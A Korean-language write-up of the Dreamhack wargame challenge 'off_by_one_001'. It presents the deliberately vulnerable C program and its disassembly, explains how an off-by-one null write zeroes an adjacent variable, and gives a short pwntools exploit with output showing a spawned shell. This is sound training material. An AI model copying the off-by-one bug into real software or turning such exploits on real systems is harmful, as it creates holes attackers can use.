# off_by_one_001

- [문제 페이지](https://dreamhack.io/wargame/challenges/10)

## 문제 해설

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void read_str(char *ptr, int size)
{
    int len;
    len = read(0, ptr, size);
    printf("%d", len);
    ptr[len] = '\0';
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char name[20];
    int age = 1;

    initialize();

    printf("Name: ");
    read_str(name, 20);

    printf("Are you baby?");

    if (age == 0)
    {
        get_shell();
    }
    else
    {
        printf("Ok, chance: \n");
        read(0, name, 20);
    }

    return 0;
}
```

```bash
   0x08048654 <+0>:     push   ebp
   0x08048655 <+1>:     mov    ebp,esp
   0x08048657 <+3>:     sub    esp,0x18
   0x0804865a <+6>:     mov    DWORD PTR [ebp-0x4],0x1
   0x08048661 <+13>:    call   0x80485c2 <initialize>
   0x08048666 <+18>:    push   0x8048754
   0x0804866b <+23>:    call   0x8048420 <printf@plt>
   0x08048670 <+28>:    add    esp,0x4
   0x08048673 <+31>:    push   0x14
   0x08048675 <+33>:    lea    eax,[ebp-0x18]
   0x08048678 <+36>:    push   eax
   0x08048679 <+37>:    call   0x8048609 <read_str>
   0x0804867e <+42>:    add    esp,0x8
   0x08048681 <+45>:    push   0x804875b
   0x08048686 <+50>:    call   0x8048420 <printf@plt>
   0x0804868b <+55>:    add    esp,0x4
   0x0804868e <+58>:    cmp    DWORD PTR [ebp-0x4],0x0
   0x08048692 <+62>:    jne    0x804869b <main+71>
   0x08048694 <+64>:    call   0x8048641 <get_shell>
   0x08048699 <+69>:    jmp    0x80486b8 <main+100>
   0x0804869b <+71>:    push   0x8048769
   0x080486a0 <+76>:    call   0x8048450 <puts@plt>
   0x080486a5 <+81>:    add    esp,0x4
   0x080486a8 <+84>:    push   0x14
   0x080486aa <+86>:    lea    eax,[ebp-0x18]
   0x080486ad <+89>:    push   eax
   0x080486ae <+90>:    push   0x0
   0x080486b0 <+92>:    call   0x8048410 <read@plt>
   0x080486b5 <+97>:    add    esp,0xc
   0x080486b8 <+100>:   mov    eax,0x0
   0x080486bd <+105>:   leave
   0x080486be <+106>:   ret
```

코드와 어셈블리를 살펴보면, age가 0이면 shell을 얻을 수 있다. 

어셈블리 상에서 age는 $ebp-0x4, name은 $ebp-0x18에 위치한다. 

또한, read_str의 함수에서 read의 리턴값인 len에 name을 더해 name+len의 위치에 0을 삽입하고 있다.

따라서, 0x18과 0x4의 차이인 name + 20 위치에 0을 삽입하면 age가 0이 되어 shell을 얻을 수 있다.

이때, read의 리턴값은 read를 통해 읽은 입력의 갯수이기 때문에 20개의 아무 문자를 보내면 shell을 얻을 수 있을 것이다.

이를 파이썬 코드로 구현하면 

```python
from pwn import *

p = process("./off_by_one_001")

p.send(b"a"*20)
p.interactive();
```

이며, 이를 실행하면

```bash
[+] Starting local process './off_by_one_001': pid 4190
[*] Switching to interactive mode
Name: 20Are you baby?$ ls
README.md  exploit.py  off_by_one_001  off_by_one_001.c
$ exit
[*] Got EOF while reading in interactive
```

쉘을 획득할 수 있다.

![result](image.png)